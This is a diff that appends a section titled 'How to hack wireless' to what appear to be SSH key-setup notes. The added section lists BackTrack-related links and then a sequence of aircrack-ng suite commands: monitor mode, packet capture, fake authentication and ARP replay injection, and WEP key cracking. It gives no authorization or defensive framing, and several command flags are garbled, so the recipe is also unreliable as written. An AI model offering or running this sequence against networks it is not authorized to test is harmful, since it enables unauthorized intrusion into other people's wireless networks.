@@ -294,3 +294,27 @@ A note from one of our readers: Depending on your version of SSH you might also 
  Put the public key in .ssh/authorized_keys2
  Change the permissions of .ssh to 700
  Change the permissions of .ssh/authorized_keys2 to 640
+
+How to hack wireless
+==========================
+
+WEBSITES:
+http://www.backtrack-linux.org
+http://www.imgburn.com
+
+TERMINAL COMMANDS::
+ 
+ Startx
+ /etc/init.d/networking start
+ airmon-ng
+ airmon-ng stop [wireless card name]
+ airmon-ng start [wireless card name]
+ airmon-ng
+ airodump-ng [wireless card name]
+ ctrl c
+ airodump-ng w wep c [channel number] bssid [Bssid number] [wireless card name]
+ aireplay-ng -1 0 a [bssid] [wireless card name]
+ aireplay-ng -3 b [bssid][wireless card name]
+ ctrl + c
+ dir
+ aircrack-ng [filename]
